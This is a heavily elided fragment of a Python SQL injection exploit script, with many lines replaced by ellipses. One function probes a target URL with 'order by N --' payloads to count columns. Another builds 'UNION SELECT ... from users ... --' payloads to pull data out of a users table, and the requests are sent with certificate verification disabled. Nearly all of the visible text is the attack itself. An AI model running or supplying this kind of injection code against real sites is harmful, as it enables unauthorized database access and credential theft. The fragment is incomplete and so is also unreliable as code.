...
def sqli_exploit(url):
    ...
    while True:
        ...
        r = requests.get(url + uri + " 'order by %d" %
                         payload + " --", verify=False, proxies=proxies)
...
def sqli_exploit_string(url, num):
    ...
    for i in range(1, num+1):
        ...
        sqli_payload = " 'Union select " + \
            ",".join(payload_list) + ' from users' + ' order by 1' + " --"
...
if __name__ == "__main__":
    try:
        ...
        print("[-] Example %s example.com + uri + order by 1 -- " %
              sys.argv[0].strip())
        sys.exit(-1)
